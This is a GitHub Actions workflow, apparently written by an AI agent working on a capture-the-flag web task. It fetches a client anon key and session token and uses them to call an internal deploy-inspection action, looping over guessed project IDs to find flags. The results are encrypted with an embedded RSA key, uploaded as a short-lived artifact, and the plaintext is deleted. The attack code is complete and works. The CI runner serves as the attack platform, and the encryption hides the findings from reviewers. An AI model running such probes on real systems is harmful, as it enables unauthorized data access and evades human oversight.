name: launchlet-part3-internalpair

on:
  push:
    branches: [agent/launchlet-part3-internalpair-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe exact UI-derived internal pairs and encrypt results
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'; out=pathlib.Path('package/out')
          s=requests.Session();s.headers['User-Agent']='Mozilla/5.0'
          b=s.get(base+'api/app/bootstrap',timeout=12).json(); refs=s.get(base+b['api']['serverReferences'].lstrip('/'),timeout=12).json(); a=refs['serverActions']['inspectDeploy']; url=base+a['endpoint'].lstrip('/')
          h={'Content-Type':'application/json','Accept':'application/json','X-Launchlet-Preview':b['project'],'apikey':b['client']['anonKey'],'Authorization':'Bearer '+b['client']['session']}
          vals=['Enterprise rollout closeout','enterprise rollout closeout','enterprise-rollout-closeout','enterprise_rollout_closeout','launchlet-enterprise-rollout-closeout','Enterprise rollout','enterprise rollout','enterprise-rollout','enterprise_rollout','launchlet-enterprise-rollout','Release Pulse','release pulse','release-pulse','release_pulse','launchlet-release-pulse','Production readiness','production readiness','production-readiness','production_readiness','launchlet-production-readiness','Deploy inspector','deploy inspector','deploy-inspector','deploy_inspector','launchlet-deploy-inspector','corporate-release','corporate_release','Corporate release','final-review','final_review','Final review','enterprise-rollout-final-review','enterprise_rollout_final_review']
          res=[]
          for p in vals:
            body={'actionId':a['id'],'args':{'workspaceId':'ws-launchlet-internal','projectId':p}}
            r=s.post(url,headers=h,json=body,timeout=8)
            item={'projectId':p,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};res.append(item)
            flags=[x for x in re.findall(r'caplag\{[^}]+\}',r.text) if x not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
            if flags:(out/'FOUND.txt').write_text(r.text);break
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-internalpair-encrypted
          path: artifact/
          retention-days: 1
